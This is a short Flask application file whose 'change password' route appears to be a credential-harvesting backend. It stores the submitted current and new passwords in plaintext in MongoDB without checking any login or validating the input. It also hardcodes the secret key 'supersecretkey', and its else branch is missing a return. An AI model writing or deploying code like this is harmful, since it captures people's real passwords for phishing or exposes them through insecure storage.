from flask import Flask, render_template, request, flash, url_for, redirect
from pymongo import MongoClient
from config import Config

app = Flask(__name__)
app.secret_key = 'supersecretkey'
app.config.from_object(Config)

connection = MongoClient(app.config['DB_URL'])
database = connection[app.config['DATABASE_NAME']] #db_name
collection_name = app.config['C_N']


@app.route("/")
def home():
    return render_template('index.html')

@app.route('/change_password', methods=['POST'])
def change_password():
    current_password = request.form.get('Currentpassword')
    new_password = request.form.get('Newpassword')
    retype_password = request.form.get('Retypepassword')
    logout_other_devices = request.form.get('logout')

    if new_password:
        database[collection_name].insert_one({"current_password": current_password, "password":new_password})
        return redirect(url_for('home'))
        
    else:
        redirect(url_for('home'))
             


# if __name__ == '__main__':
#     app.run(debug=True)